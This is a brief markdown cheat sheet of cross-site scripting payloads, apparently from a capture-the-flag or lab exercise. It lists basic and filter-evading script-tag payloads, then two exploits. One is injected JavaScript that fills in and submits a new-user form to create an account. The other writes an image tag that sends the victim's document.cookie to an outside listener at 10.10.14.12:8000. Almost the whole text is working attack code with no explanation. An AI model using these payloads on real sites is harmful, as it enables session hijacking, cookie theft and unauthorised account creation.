# Payloads

  1. `<script>alert(1)<script>`
  2. `<scrscriptipt>alert(1)</scr/scriptipt>`


  

## Exploits
   
   1.  
	     `<script>document.links[0].click();document.getElementsByName('username').value="foo";`
	     `document.getElementsByName('password').value="foo";document.getElementsByName('password2').value="foo";document.forms[0].submit()</script>`
	     `<a href="http://localhost/newUser?username=test&password=test&password2=test">clickme</a>`  


   2. 

         `document.write('<img src="http://10.10.14.12:8000/?'+document.cookie+'">');`